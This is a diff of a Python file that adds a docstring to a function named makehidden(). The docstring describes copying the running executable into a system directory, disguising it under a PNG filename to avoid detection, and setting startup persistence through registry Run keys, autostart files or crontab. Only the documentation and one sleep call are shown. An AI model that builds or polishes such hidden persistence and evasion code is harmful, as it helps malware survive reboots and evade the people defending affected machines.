@@ -1,12 +1,48 @@
-import os
-import sys
-import time
-import subprocess
-import shutil
+import os, sys, time, subprocess
 from pathlib import Path
 
 
 def makehidden():
+    """
+    Copies the current executable to a hidden location and sets it up to run at system startup.
+    
+    This function performs the following operations:
+    1. Copies the running executable to a system directory (ProgramData on Windows, /usr/local/bin on Linux)
+    2. On Windows, uses a temporary PNG filename before renaming to EXE to avoid detection
+    3. Sets up persistence mechanism:
+       - Windows: Adds registry entry in HKCU\\...\\Run
+       - Linux: Creates .desktop file in autostart directories or adds @reboot entry to crontab
+    4. Launches the copied executable
+    
+    Features:
+    - Cross-platform support (Windows/Linux)
+    - Comprehensive error handling
+    - Multiple fallback methods for persistence
+    - Cleanup of temporary files if operations fail
+    
+    Returns:
+        bool: True if all operations completed successfully, False if any step failed
+        
+    Side Effects:
+        - Creates file in system directory
+        - Modifies system startup configuration (registry/crontab)
+        - Launches new process
+        
+    Security Considerations:
+        - On Windows, uses temporary PNG filename to avoid detection
+        - On Linux, uses dot-prefixed hidden filenames
+        - Sets proper executable permissions on Linux
+        
+    Error Handling:
+        - Continues operation if non-critical steps fail
+        - Cleans up temporary files if operations fail
+        - Returns False on any critical failure
+        
+    Example:
+        >>> success = makehidden()
+        >>> if not success:
+        ...     print("Failed to set up persistence")
+    """
     try:
         time.sleep(1)  # Initial delay
 
